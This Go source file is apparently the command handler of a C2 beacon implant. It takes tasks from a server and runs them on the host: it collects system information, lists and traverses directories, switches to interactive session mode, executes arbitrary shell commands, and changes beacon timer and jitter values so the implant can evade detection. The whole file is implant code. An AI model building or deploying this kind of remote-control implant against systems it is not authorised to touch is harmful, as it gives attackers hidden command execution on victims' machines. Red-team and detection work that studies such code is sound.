package beaconhandler

import (
	"encoding/json"
	"fmt"
	"strings"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// executeCommand dispatches a single command to the appropriate handler and returns its report and a bool on whether
// to switch to session mode.
func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, bool) {
	if command.Command == "" || command.CommandUUID == "" {
		logger.Error("Invalid command format received (empty command or uuid).")
		return httpFuncs.CommandReport{
			Output:      "Error: Invalid command format from server.",
			CommandUUID: command.CommandUUID,
		}, false
	}
	var commandData string

	if command.Command != "update" {
		if err := json.Unmarshal(command.Data, &commandData); err != nil {
			logger.Error(fmt.Sprintf("Failed to unmarshal path from command data: %v. Data: %s", err, string(command.Data)))

			return httpFuncs.CommandReport{
				Output:      "Error: Malformed command data.",
				CommandUUID: command.CommandUUID}, false
		}
	}

	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
	var outputMsg string

	// Define a map of command handlers for easier extensibility.
	type commandHandlerFunc func(httpFuncs.CommandData, string) (string, bool)
	handlers := map[string]commandHandlerFunc{
		"session": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("switching to 'session' mode")
			return "ack", true
		},
		"update": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("Processing 'update' command.")
			return handleUpdateCommand(cmd.Data), false
		},
		"systeminfo": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("Processing 'systemInfo' command.")
			return commands.SysInfoString(), false
		},
		"list_dir": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("Processing 'listDirectory' command.")
			return commands.DirOutputAsString(data), false
		},
		"directory_traversal": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("Running a dir traversal")
			return commands.DirectoryTraversal(data), false
		},
		"shell": func(cmd httpFuncs.CommandData, data string) (string, bool) {
			logger.Log("Processing 'shell' command.")
			if data == "" {
				logger.Error("Shell command received with empty data.")
				return "Error: No shell command provided.", false
			}
			output, err := commands.RunShellCommand(data)
			if err != nil {
				logger.Error(fmt.Sprintf("Shell command execution failed: %v", err))
				return "Error: " + err.Error(), false
			}
			logger.Log(fmt.Sprintf("Shell command executed successfully: %s", output))
			return output, false
		},
	}
	var switchSession bool
	handler, exists := handlers[command.Command]
	if exists {
		outputMsg, switchSession = handler(command, commandData)
	} else {
		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
		outputMsg = handleGenericCommand(command)
	}

	return httpFuncs.CommandReport{Output: outputMsg, CommandUUID: command.CommandUUID}, switchSession
}

// handleUpdateCommand processes the 'update' command, modifying the agent's config.
func handleUpdateCommand(data json.RawMessage) string {
	logger.Log("Handling 'update' command with provided data.")
	var updateData httpFuncs.UpdateCommandPayload
	if err := json.Unmarshal(data, &updateData); err != nil {
		logger.Error(fmt.Sprintf("Failed to unmarshal update command data: %v. Data: %s", err, string(data)))
		return "Error: Malformed data for 'update' command: " + err.Error()
	}

	var outputMsgs []string
	config.ConfigMutex.Lock()
	defer config.ConfigMutex.Unlock()

	if updateData.Timer > 0 {
		config.Timer = updateData.Timer
		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %d", config.Timer))
		logger.Log(fmt.Sprintf("Timer updated to %d seconds", config.Timer))
	}
	if updateData.Jitter >= 0 {
		config.Jitter = updateData.Jitter
		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %d", config.Jitter))
		logger.Log(fmt.Sprintf("Jitter updated to %d seconds", config.Jitter))
	}

	if len(outputMsgs) == 0 {
		logger.Warn("No valid timer or jitter values provided in update command.")
		return "Error: No valid timer or jitter values provided."
	}
	return strings.Join(outputMsgs, ", ")
}

// handleGenericCommand processes any command that isn't a special case.
func handleGenericCommand(command httpFuncs.CommandData) string {
	var cmdDataStr string
	if err := json.Unmarshal(command.Data, &cmdDataStr); err != nil {
		// If data isn't a simple string, use its raw representation.
		cmdDataStr = string(command.Data)
		if cmdDataStr == "null" {
			cmdDataStr = ""
		}
	}
	return fmt.Sprintf("Output for command '%s'", command.Command)
}
